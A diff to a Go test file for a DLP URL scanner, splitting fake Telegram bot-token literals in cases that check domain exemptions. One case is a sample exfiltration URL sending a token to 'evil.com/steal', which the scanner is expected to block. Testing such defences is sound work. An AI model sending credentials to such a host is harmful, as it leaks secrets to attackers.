@@ -3745,31 +3745,31 @@ func TestScan_DLPExemptDomains(t *testing.T) {
 		{
 			name:        "exempt exact domain allows token in path",
 			exempt:      []string{"api.telegram.org"},
-			url:         "https://api.telegram.org/bot" + "1234567890:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
+			url:         "https://api.telegram.org/bot" + "1234567890:" + "AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
 			shouldAllow: true,
 		},
 		{
 			name:        "exempt wildcard allows subdomain",
 			exempt:      []string{"*.telegram.org"},
-			url:         "https://api.telegram.org/bot" + "1234567890:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
+			url:         "https://api.telegram.org/bot" + "1234567890:" + "AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
 			shouldAllow: true,
 		},
 		{
 			name:        "non-exempt domain still blocked",
 			exempt:      []string{"api.telegram.org"},
-			url:         "https://evil.com/steal?token=" + "1234567890:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr",
+			url:         "https://evil.com/steal?token=" + "1234567890:" + "AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr",
 			shouldAllow: false,
 		},
 		{
 			name:        "no exemptions blocks everywhere",
 			exempt:      nil,
-			url:         "https://api.telegram.org/bot" + "1234567890:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
+			url:         "https://api.telegram.org/bot" + "1234567890:" + "AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
 			shouldAllow: false,
 		},
 		{
 			name:        "case insensitive exemption",
 			exempt:      []string{"API.Telegram.ORG"},
-			url:         "https://api.telegram.org/bot" + "1234567890:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
+			url:         "https://api.telegram.org/bot" + "1234567890:" + "AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe",
 			shouldAllow: true,
 		},
 	}
@@ -3824,7 +3824,7 @@ func TestScan_DLPExemptDomainsOtherPatternsStillFire(t *testing.T) {
 	defer s.Close()
 
 	// Telegram token to Telegram: allowed (exempt)
-	result := s.Scan(context.Background(), "https://api.telegram.org/bot"+"1234567890:AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe")
+	result := s.Scan(context.Background(), "https://api.telegram.org/bot"+"1234567890:"+"AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPqqr/getMe")
 	if !result.Allowed {
 		t.Errorf("expected Telegram token to Telegram to be allowed, got blocked: %s", result.Reason)
 	}
